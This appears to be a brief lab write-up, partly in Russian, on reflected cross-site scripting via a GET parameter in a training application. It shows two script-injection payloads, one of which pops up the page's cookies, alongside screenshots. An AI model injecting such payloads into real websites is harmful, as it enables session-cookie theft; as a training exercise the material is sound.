---
title: XSS - Reflected (GET)
---

# XSS - Reflected (GET)

Вводим обычные значения, а после вводим скрипт

![](images/img_1.png)
```bash
<script>alert(document.cookie)</script>
```
```bash
<script>alert("daniil")</script>
```
![](images/img_2.png)

![](images/img_3.png)